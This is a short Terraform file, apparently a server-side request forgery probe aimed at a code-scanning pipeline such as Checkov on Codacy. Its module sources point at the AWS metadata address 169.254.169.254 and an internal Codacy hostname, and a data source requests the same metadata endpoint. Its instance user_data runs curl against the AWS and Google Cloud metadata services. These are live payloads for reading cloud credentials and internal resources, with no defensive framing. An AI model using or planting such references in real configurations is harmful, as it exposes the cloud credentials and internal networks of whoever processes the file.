# SSRF Test - Terraform remote module reference
module "ssrf_test" {
  source = "git::https://169.254.169.254/latest/meta-data//test-module"
}

module "ssrf_test2" {
  source = "https://internal.codacy.internal/terraform-module"
}

resource "aws_instance" "test" {
  ami           = "ami-12345678"
  instance_type = "t2.micro"
  
  user_data = <<-EOF
    #!/bin/bash
    curl http://169.254.169.254/latest/meta-data/
    curl http://metadata.google.internal/computeMetadata/v1/
  EOF
}

# Test Checkov SSRF via external module references
data "http" "ssrf_test" {
  url = "http://169.254.169.254/latest/meta-data/"
  
  request_headers = {
    Accept = "application/json"
  }
}
